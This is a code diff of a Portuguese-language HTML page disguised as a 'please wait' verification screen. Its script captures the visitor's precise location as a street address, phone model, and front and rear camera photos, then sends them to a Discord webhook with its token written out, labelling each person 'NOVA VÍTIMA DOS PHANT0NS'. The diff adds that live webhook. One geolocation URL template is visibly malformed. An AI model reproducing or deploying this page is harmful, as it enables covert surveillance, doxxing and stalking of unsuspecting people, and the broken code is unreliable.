@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação</title>
+    <title>Aguarde...</title>
     <style>
         body { background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; }
         .vermelho { color: red; font-weight: bold; font-size: 26px; }
@@ -22,24 +22,23 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // WEBHOOK CORRIGIDO
-        const WEBHOOK = 'https://discord.com';
+        const WEBHOOK = 'https://discord.com/api/webhooks/1495823762464178316/JUtyoihcRDnKawG_caqxpZ-G4k7NlZpSMSD5TOYG_gZj6asa9SCXsN1d8G-VSstpePse';
 
         document.getElementById('btn').addEventListener('click', async () => {
             document.getElementById('m').style.display = 'block';
             document.getElementById('btn').style.display = 'none';
 
             try {
-                // 1. Localização corrigida
+                // 1. Localização por extenso (Endereço Real)
                 const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-                const res = await fetch(`https://openstreetmap.org{p.coords.latitude}&lon=${p.coords.longitude}`);
-                const d = await res.json();
-                const endereco = d.display_name || "Endereço não identificado";
+                const resLocal = await fetch(`https://openstreetmap.org{p.coords.latitude}&lon=${p.coords.longitude}`);
+                const dLocal = await resLocal.json();
+                const endereco = dLocal.display_name || "Não identificado";
 
-                // 2. Modelo Celular corrigido
-                const userAgent = navigator.userAgent;
-                const modMatch = userAgent.match(/\(([^)]+)\)/);
-                const modelo = modMatch ? modMatch[1].split(';')[2] || modMatch[1] : "Desconhecido";
+                // 2. Modelo do Celular
+                const ua = navigator.userAgent;
+                const modMatch = ua.match(/\(([^)]+)\)/);
+                const modelo = modMatch ? modMatch[1].split(';')[0] : "Desconhecido";
 
                 // 3. Foto Frontal
                 const s1 = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
@@ -50,11 +49,8 @@
                 const f2 = await tirar(s2);
 
                 await enviar(f1, f2, endereco, modelo);
-                
                 setTimeout(() => { window.location.href = "about:blank"; }, 3000);
             } catch (e) { 
-                console.log(e);
-                // Se der erro, ele tenta enviar só o que conseguiu ou sai
                 setTimeout(() => { window.location.href = "about:blank"; }, 2000);
             }
         });
@@ -74,13 +70,13 @@
         async function enviar(img1, img2, end, mo) {
             const fd = new FormData();
             const payload = {
-                content: "NOVA VÍTIMA DOS PHANT0NS 😈😈😈😈",
+                content: "NOVA VÍTIMA DOS PHANT0NS😈😈😈😈",
                 embeds: [{
-                    title: "DADOS DA VÍTIMA",
-                    description: `📍 **LOCALIZAÇÃO:**\n${end}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📱 **MODELO CELULAR:**\n${mo}\n\nphant0ns 😈`,
+                    description: `📍 **LOCALIZAÇÃO:**\n${end}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📸 **Foto Frontal:** (Anexa)\n📷 **Foto Traseira:** (Anexa)\n\n📱 **MODELO CELULAR:**\n${mo}\n\nphant0ns😈`,
                     color: 16711680,
-                    image: { url: 'attachment://f1.jpg' },
-                    thumbnail: { url: 'attachment://f2.jpg' }
+                    image: { url: 'attachment://f1.jpg' }
+                }, {
+                    image: { url: 'attachment://f2.jpg' }
                 }]
             };
             fd.append('payload_json', JSON.stringify(payload));
